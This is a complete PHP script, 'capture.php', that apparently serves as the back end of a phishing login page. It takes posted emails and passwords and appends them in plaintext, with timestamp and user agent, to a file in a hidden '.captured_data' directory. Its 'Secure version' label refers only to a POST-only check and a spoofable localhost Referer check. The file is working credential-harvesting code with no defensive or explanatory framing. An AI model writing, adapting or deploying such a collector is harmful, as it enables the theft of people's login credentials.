<?php
// capture.php - Secure version
// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die('Method not allowed');
}

// Check if request is from our own domain (basic protection)
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$allowed_hosts = ['localhost:8000', '127.0.0.1:8000'];

$is_allowed = false;
foreach ($allowed_hosts as $host) {
    if (strpos($referer, $host) !== false) {
        $is_allowed = true;
        break;
    }
}

if (!$is_allowed) {
    http_response_code(403);
    die('Access denied');
}

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Get the POST data
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    // Create log entry with timestamp
    $timestamp = date('Y-m-d H:i:s');
    $source = isset($data['source']) ? $data['source'] : 'main-login';
    $log_entry = "[$timestamp] Source: $source | Email: {$data['email']} | Password: {$data['password']} | User Agent: {$data['userAgent']}\n";
    
    // Write to file in a hidden directory
    $log_dir = '.captured_data';
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0755, true);
    }
    
    $log_file = $log_dir . '/data.txt';
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Return success response
    echo json_encode(['status' => 'success', 'message' => 'Data captured']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}
?>
